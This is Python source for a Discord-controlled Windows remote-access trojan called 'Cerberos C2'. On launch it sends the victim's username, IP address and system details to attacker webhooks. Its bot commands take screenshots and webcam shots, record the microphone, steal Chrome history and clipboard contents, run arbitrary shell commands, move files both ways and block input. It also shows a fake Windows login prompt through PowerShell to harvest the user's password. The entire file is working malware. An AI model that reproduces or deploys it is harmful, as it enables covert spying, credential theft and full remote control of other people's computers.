### Imports

from pynput.keyboard import Key, Controller
from tkinter import messagebox
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from urllib.request import urlopen
from urllib import response
from requests import get
from comtypes import CLSCTX_ALL
from ctypes import *
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from time import time
from discord.ext import commands
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
from ctypes import windll
import pythoncom
import discord
import os
import sys
import win32gui
import win32com.client
import base64
import sqlite3
import win32crypt
import webbrowser
import requests
import tempfile
import json
import os
import getpass
import platform
import sys
import pyautogui
import cv2
import random
import subprocess
import time
import pyaudio
import wave
import win32clipboard
import shutil
import ctypes
import tkinter
import threading
import re
import folium


usr = getpass.getuser()
path_install = fr"C:\Users\{usr}\.config"

if not os.path.exists(path_install):
    import os
    usr = getpass.getuser()
    path = fr'"C:\Users\{usr}\.config"'
    new_path = path[1:]
    new_path = new_path[:-1]
    os.mkdir(new_path)     
    os.system(f"attrib +h {path}")
else:
    pass

AGENT_ONLINE_ID = "[AGENT_ONLINE_WBHOOK]"
COMMAND_CONTROL_ID = "[C2_WEBHOOK]" 
SCREENSHOT_ID = "[SCREENSHOT_WEBHOOK]"
WEB_CAM_ID = "[WEBCAM_WEBHOOK]"
MIC_ID = "[MICROPHONE_WEBHOOK]"
DOWNLOAD_ID = "[DOWNLOAD_WEBHOOK]"
BOT_TOKEN = "[BOT_TOKEN_HERE]"

version = "v1.0.0"
author = "Vczz0"
github_link = "https://github.com/Vczz0"

ip = get('https://api.ipify.org').text
os = platform.system() 
cpu = platform.processor() 
bitz = platform.architecture(bits="")[-2] 
name  = platform.machine()
vers = platform.version()
now = datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

tmp = tempfile.gettempdir()

bot = commands.Bot(command_prefix='!', help_command=None)

try:
    path_config = fr"C:\Users\{usr}\.config\ID"
    with open(path_config, "r+") as IDfile:
        ID = IDfile.read()
        if ID == "":
            ID = random.randint(1, 10000)
            IDfile.write(str(ID))
            MSG = f"New Agent Online #{ID}"
            print(MSG)
        else:
            MSG = f"Agent Online #{ID}"
            print(MSG)

except Exception:
    path_config = fr"C:\Users\{usr}\.config\ID"
    with open(path_config, "w+") as IDfile:
        ID = IDfile.read()
        if ID == "":
            ID = random.randint(1, 10000)
            IDfile.write(str(ID))
            MSG = f"New Agent Online #{ID}"
            print(MSG)
        else:
            MSG = f"Agent Online #{ID}"
            print(MSG)

webhook = DiscordWebhook(url=AGENT_ONLINE_ID)
embed = DiscordEmbed(title=f"**New Client Online: {usr}  #{ID}**" , description="Date Since Online: " + dt_string, color="09e30d")
embed.add_embed_field(name='Username: ', value=usr, inline=True)
embed.add_embed_field(name='IP: ', value=ip, inline=True)
embed.add_embed_field(name='OS: ', value=os, inline=True)
embed.add_embed_field(name='Machine Name: ', value=name, inline=True)
embed.add_embed_field(name='Bits: ', value=bitz + "s", inline=True)
embed.add_embed_field(name='OSVersion: ', value=vers, inline=True)
embed.add_embed_field(name='CPU: ', value=cpu, inline=False)
webhook.add_embed(embed)
response = webhook.execute()



@bot.command(name="info", pass_ctx=True)
async def info(ctx):
    command = ctx.message.content.replace("!info", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Able To Grab Cerberos  C2 Info On: {usr} #{ID}**", description=None, color='09e30d')
            embed.add_embed_field(name="User: ", value=f"{usr} #{ID}", inline=True)
            embed.add_embed_field(name="Version: ", value=version, inline=True)
            embed.add_embed_field(name="Author: ", value=author, inline=True)
            embed.add_embed_field(name="Github: ", value=github_link, inline=True)
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able To Read Cerberos C2 Info On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="screenshot", pass_ctx=True)
async def screenshot(ctx):
    command = ctx.message.content.replace("!screenshot", "")
    check_id = command.split()
    path_screenshot = fr"C:\Users\{usr}\.config\tessssbhcbjkadlt.png"
    if int(check_id[0]) == int(ID):
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(path_screenshot)
            webhook = DiscordWebhook(url=SCREENSHOT_ID, content=f"Succesfull Grabbed Screenshot from: {usr} #{ID}")
            with open(path_screenshot, "rb") as f:
                webhook.add_file(file=f.read(), filename='screenshot.jpg')
            response = webhook.execute()
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Able to Take ScreenShot On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able to Take ScreenShot On: {usr} #{ID} **", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="frontcam", pass_ctx=True)
async def frontcam(ctx):
    command = ctx.message.content.replace("!frontcam", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            path_cam = fr"C:\Users\{usr}\.config\895234g5234h689.jpg"
            webcam = cv2.VideoCapture(0)
            check, frame = webcam.read()
            cv2.imwrite(filename=path_cam, img=frame)
            webcam.release()

            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Able to Take WEBCAM Shot from: {usr} #{ID} **", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
            webhook = DiscordWebhook(url=WEB_CAM_ID, content=f"Was Able to Take WEBCAM Shot from: {usr} #{ID}")
            with open(path_cam, "rb") as f:
                    webhook.add_file(file=f.read(), filename='snapshot.jpg')
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able to take WEBCAM Shot from: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="ipinfo", pass_ctx=True)
async def frontcam(ctx):
    command = ctx.message.content.replace("!ipinfo", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip={ip}"
            response=urlopen(url)
            data=json.load(response)
            ip_req = data["geoplugin_request"]
            city = data["geoplugin_city"]
            region = data["geoplugin_region"]
            regcode = data["geoplugin_regionCode"]
            countrycode = data["geoplugin_countryCode"]
            country = data["geoplugin_countryName"]
            continent = data["geoplugin_continentName"]
            Lat = data["geoplugin_latitude"]
            longi = data["geoplugin_longitude"]
            currency = data["geoplugin_currencyCode"]
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Able To Grab IPInfo: {usr} #{ID}**", description="Use The Function !map To Display Coordinates  In a Map", color='09e30d')
            embed.add_embed_field(name="IP: ", value=ip_req, inline=True)
            embed.add_embed_field(name="City: ", value=city, inline=True)
            embed.add_embed_field(name="Region: ", value=region, inline=True)
            embed.add_embed_field(name="RegionCode: ", value=regcode, inline=True)
            embed.add_embed_field(name="Country: ", value=country, inline=True)
            embed.add_embed_field(name="CountryCode: ", value=countrycode, inline=True)  
            embed.add_embed_field(name="Currency: ", value=currency, inline=True)        
            embed.add_embed_field(name="Continent: ", value=continent, inline=True)
            embed.add_embed_field(name="Lat: ", value=Lat, inline=True)
            embed.add_embed_field(name="long: ", value=longi, inline=True)
            
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able To Get Info Of IP ON: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="ipmap",pass_ctx = True)
async def map(ctx):
    command = ctx.message.content.replace("!ipmap", "")
    check_id = command.split()
    path_map_loc = fr"c:\Users\{usr}\.config\map.html"
    if int(check_id[0]) == int(ID):
        try:
            url = f"http://www.geoplugin.net/json.gp?ip={ip}"
            response=urlopen(url)
            data=json.load(response)
            LAT = data["geoplugin_latitude"]
            LONG = data["geoplugin_longitude"]
            myAddress = LAT, LONG

            mymap1 = folium.Map(location=myAddress, zoom_start=12)
            folium.CircleMarker(location=myAddress, radius=50, popup="Yorkshire").add_to(mymap1)

            folium.Marker(myAddress).add_to(mymap1).add_to(mymap1)
            mymap1.save(path_map_loc)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID, content=f"Was Able locate Client: {usr} #{ID}")
            with open(path_map_loc, "rb") as f:
                    webhook.add_file(file=f.read(), filename='map.html')
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able to locate Client: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="mic", pass_ctx=True)
async def mic(ctx):
    command = ctx.message.content.replace("!mic", "")
    check_id = command.split()
    path_mic = fr"c:\Users\{usr}\.config\mic.wav"
    if int(check_id[0]) == int(ID):
        try:
            def mic():

                CHUNK = 1024
                FORMAT = pyaudio.paInt16
                CHANNELS = 1
                RATE = 44100 

                p = pyaudio.PyAudio()

                stream = p.open(format=FORMAT,
                                channels=CHANNELS,
                                rate=RATE,
                                input=True,
                                frames_per_buffer=CHUNK)

                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Recording Mic from: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()


                frames = []
                seconds = 10
                for i in range(0, int(RATE / CHUNK * seconds)):

                    data = stream.read(CHUNK)

                    frames.append(data)

                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Recording Mic stopped: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()

                stream.start_stream()
                stream.close()
                p.terminate()

                wf = wave.open(path_mic, "wb")
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()
                webhook = DiscordWebhook(url=MIC_ID, content=f"Was Able to record MIC from: {usr} #{ID}")
                with open(path_mic, "rb") as f:
                    webhook.add_file(file=f.read(), filename='mic.wav')
                response = webhook.execute()
    
            mic = threading.Thread(target=mic)
            mic._running = True
            mic.daemon = True
            mic.start()   
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Able to record mic from: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()


        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able to record mic from: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="list")
async def ls(ctx):
    try:
        webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
        embed = DiscordEmbed(title=f"**{usr} #{ID}**", description=None, color='09e30d')
        embed.add_embed_field(name="ID# ", value=str(ID), inline=True)
        embed.add_embed_field(name="IP: ", value=ip, inline=True)
        embed.add_embed_field(name="OS: ", value=f"{os} {vers}", inline=True)
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

@bot.command(name="terminate", pass_ctx=True)
async def terminate(ctx):
    command = ctx.message.content.replace("!terminate", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Terminating Connection From: {usr} #{ID}**", description=None, color='0080ff')
            webhook.add_embed(embed)
            response = webhook.execute()
            sys.exit()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was not able to Terminating Connection From: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="chromehistory", pass_ctx=True)
async def terminate(ctx):
    command = ctx.message.content.replace("!chromehistory", "")
    check_id = command.split()
    path_history = fr"C:\Users\{usr}\.config\FileHistory.txt"
    if int(check_id[0]) == int(ID):
        try:
            import os 
            print("Executed..", file=open(path_history, "w"))
            con = sqlite3.connect(fr"C:\Users\{usr}\AppData\Local\Google\Chrome\User Data\Default\History")
            c = con.cursor()
            c.execute("select url, title, visit_count, last_visit_time from urls") 
            results = c.fetchall()
            for r in results:
                print(f"\n {r}", file=open(path_history, "a"))

            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Able To Grab Chrome History from: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()

            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID, content=f"Succesfull Grabbed Chrome History from: {usr} #{ID}")
            with open(path_history, "rb") as f:
                webhook.add_file(file=f.read(), filename='File.txt')
            response = webhook.execute()

        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able to Grab History from: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="cmd", pass_ctx=True)
async def cmd(ctx):
    command = ctx.message.content.replace("!cmd", "")
    check_id = command.split()
    path_command_store = fr"C:\Users\{usr}\.config\FileCmd.txt"
    if int(check_id[0]) == int(ID):
        try:
            check_id.pop(0)
            cmd = " ".join(check_id)

            result = subprocess.Popen(cmd.split(), stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True, creationflags=0x08000000)
            comand, err = result.communicate()
            result.wait()
            
            if comand == "":
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Executed On: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()              
            else:
                if len(comand) > 4000:
                    webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                    print(comand, file=open(path_command_store, "w"))
                    with open(path_command_store, "rb") as f:
                        webhook.add_file(file=f.read(), filename='Command.txt')
                    response = webhook.execute()
                else:
                    webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                    embed = DiscordEmbed(title=f"**Command Executed On: {usr} #{ID}**", description=f"{comand}", color='09e30d')
                    webhook.add_embed(embed)
                    response = webhook.execute()
        except Exception as e:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Was Not Able To Executed Command On: {usr} #{ID}**", description=f"{e}", color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()

@bot.command(name="resetID", pass_ctx=True)
async def reset(ctx):
    try:
        path_upload = fr"C:\Users\{usr}\.config\ID"
        with open(path_upload, "w+") as IDfile:
            ID = random.randint(1, 10000)
            IDfile.write(str(ID))
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Able to reset ID. New ID: {usr} #{ID}**", description="Note: New ID Will Be Used After Restart Of Program", color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
            NEWID = f"New Agent Online #{ID}"
            print(NEWID)
    except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Not Able to reset ID From: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="destruct", pass_ctx=True)
async def destruct(ctx):
    command = ctx.message.content.replace("!destruct", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            import os
            import sys
            path_destruct = fr"C:\Users\{usr}\.config"
            shutil.rmtree(path_destruct)
            path_persist_exe = fr"{tmp}\Config"
            if os.path.exists(path_persist_exe):
                shutil.rmtree(path_persist_exe)
                subprocess.call("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Edge /f", shell=True)

            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Succesfull Destructed On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Not Able to Destruct On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="upload", pass_ctx=True)
async def upload(ctx):
    command = ctx.message.content.replace("!upload", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            url_download = check_id[1]
            response = requests.get(url_download)
            path_upload_file = check_id[2].replace("user", usr)
            open(path_upload_file, "wb").write(response.content)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Succesfull Uploaded {check_id[2]} On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**File Can't be uploaded{check_id[2]} on: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="download", pass_ctx=True)
async def upload(ctx):
    command = ctx.message.content.replace("!download", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            path_download = check_id[1].replace("user", usr)
            webhook = DiscordWebhook(url=DOWNLOAD_ID, content=f"Downloaded File {check_id[1]} from: {usr} #{ID}")
            with open(path_download, "rb") as f:
                webhook.add_file(file=f.read(), filename=check_id[1])
            response = webhook.execute()
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Able to Download {check_id[1]} from: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able to Download {check_id[1]} from: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="clipboard", pass_ctx=True)
async def clipboar(ctx):
    command = ctx.message.content.replace("!clipboard", "")
    check_id = command.split()
    path_clipboard = fr"C:\Users\{usr}\.config\Clipboard.txt"
    if int(check_id[0]) == int(ID):
        try:
            win32clipboard.OpenClipboard()
            value_clipboard = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if len(value_clipboard) > 4000:
                    webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                    print(value_clipboard, file=open(path_clipboard, "w"))
                    with open(path_clipboard, "rb") as f:
                        webhook.add_file(file=f.read(), filename="clipboard.txt")
                    response = webhook.execute()
            else:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Successfull Captured Clipboard From: {usr} #{ID}**", description=value_clipboard, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()

        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able To Capture Clipboard From: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="cd", pass_ctx=True)
async def cd(ctx):
    command = ctx.message.content.replace("!cd", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        path_cd = check_id[1]
        try:
            import os
            os.chdir(path_cd)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull CD in {path_cd} on: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()

        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Not Able To CD in {path_cd} on: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="wallpaper", pass_ctx=True)
async def wallpaper(ctx):
    command = ctx.message.content.replace("!wallpaper", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            path_wallpaper = check_id[1].replace("user", usr)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path_wallpaper , 0)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Changed Wallpaper on: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Change Wallpaper on: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="admincheck", pass_ctx=True)
async def admin(ctx):
    command = ctx.message.content.replace("!admincheck", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Yes Admin Rights on: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()
            elif is_admin == False:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**No Admin Rights on: {usr} #{ID}**", description=None, color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()

        except Exception as e:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Failed To Check Admin Rights on: {usr} #{ID}**", description=f"{e}", color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()

@bot.command(name="block", pass_ctx=True)
async def lock(ctx):
    command = ctx.message.content.replace("!block", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                block_input = windll.user32.BlockInput(True)
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Successfull Blocked Input On: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()
            else:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**No Admin Rights on: {usr} #{ID}**", description=None, color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()
 
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Block Input On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="unblock", pass_ctx=True)
async def unblock(ctx):
    command = ctx.message.content.replace("!unblock", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                block_input = windll.user32.BlockInput(False)
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Successfull Unblocked Input On: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()
            else:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**No Admin Rights on: {usr} #{ID}**", description=None, color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()
 
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Unblock Input On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="volumemax", pass_ctx=True)
async def volumeup(ctx):
    command = ctx.message.content.replace("!volumemax", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Changed Volume To Max On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Change Volume To Max On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="volumedown", pass_ctx=True)
async def volumedown(ctx):
    command = ctx.message.content.replace("!volumedown", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Changed Volume To 0 On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Change Volume To 0 On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="say", pass_ctx=True)
async def say(ctx):
    command = ctx.message.content.replace("!say", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        say_content = check_id[1:]
        try:
            def say():
                pythoncom.CoInitialize()
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Saying: {say_content} On: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()

                say = win32com.client.Dispatch("SAPI.SpVoice")
                say.Speak(say_content)

                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Successfull Said: {say_content} On: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()

            saying = threading.Thread(target=say)
            saying._running = True
            saying.daemon = True
            saying.start()   
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Not Able To Say: {say_content} On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="rickroll", pass_ctx=True)
async def say(ctx):
    command = ctx.message.content.replace("!rickroll", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
            webbrowser.open_new(url)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull RickRolled: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Rickroll: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="url", pass_ctx=True)
async def say(ctx):
    command = ctx.message.content.replace("!url", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            url_open = check_id[1]
            webbrowser.open_new(url_open)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Opend: {check_id[1]} on:  {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Open: {check_id[1]} on:  {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="winlogin", pass_ctx=True)
async def fakelogin(ctx):
    command = ctx.message.content.replace("!winlogin", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            def fakelogin():
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Successfull Build System Login On:  {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()

                cmd82 = "$cred=$host.ui.promptforcredential('Windows Security','',[Environment]::UserName,[Environment]::UserDomainName);"
                cmd92 = 'echo $cred.getnetworkcredential().password;'
                full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
                instruction = full_cmd

                def shell():   
                    output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    return output

                result_cred = str(shell().stdout.decode('CP437'))
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**System Login Credential From:  {usr} #{ID}**", description=f"{result_cred}", color='429bf5')
                webhook.add_embed(embed)
                response = webhook.execute()

            fakeloginscreen = threading.Thread(target=fakelogin)
            fakeloginscreen._running = True
            fakeloginscreen.daemon = True
            fakeloginscreen.start()


        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Build Fake System Login on:  {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()
            
